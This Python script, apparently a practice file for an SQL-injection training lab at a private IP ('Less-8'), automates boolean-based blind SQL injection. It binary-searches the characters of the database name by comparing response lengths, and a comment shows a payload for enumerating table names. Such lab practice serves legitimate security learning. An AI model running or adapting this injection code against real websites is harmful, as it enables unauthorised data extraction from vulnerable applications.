#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2021/5/10 14:58
# @Author  : Huang
# @FileName: sql脚本2.py
# @Software: PyCharm

# conding:utf-8
import requests

url_init = "http://192.168.127.144:83/Less-8/?id=1";

url_init_error = url_init + "'"
length_init = requests.get(url_init).headers.get('Content-Length')
database = ""


# and ascii(substr((select database()),1,1))>64 %23   然后不断增加后面的数字大小来确定
# and ascii(substr((select table_name from information_schema.tables where table_schema=hex(int (database))),1,1))>64 %23
# 写一个方法二分快速获取应该判断的数字
# 返回数字，传入布尔值，对还是错，对应的数字。
# 正经的二分查询。有序的字符中，最大最小。65到122
# 我们现在知道了返回长度多少是正确的和错误的
#
def get_length(url):
    length = requests.get(url).headers.get('Content-Length')
    # print("length:"+str(length))
    # 正确的
    if (length == length_init):
        return True
    else:
        return False


def geturl(n, number):
    url = url_init_error + "and ascii(substr((select database()),{0},1))>{1} %23".format(n, number)
    print(url)
    return url


def efs(min_number, max_number, n):
    if (max_number - min_number == 1):
        print("[+] get " + chr(max_number))
        global database
        database = database + (chr(max_number))
        print('[+] databse is {0}'.format(database))
        return
    number = int((min_number + max_number) / 2)
    # print(number)
    url = geturl(n, number)
    # print(url)
    # 如果比中间大
    if get_length(url):
        efs(number, max_number, n)
    else:
        efs(min_number, number, n)


for n in range(1, 10):
    # 如果大于1都不满足就是结束了
    if (get_length(geturl(n, 1)) is False):
        break
    else:
        efs(65, 127, n)
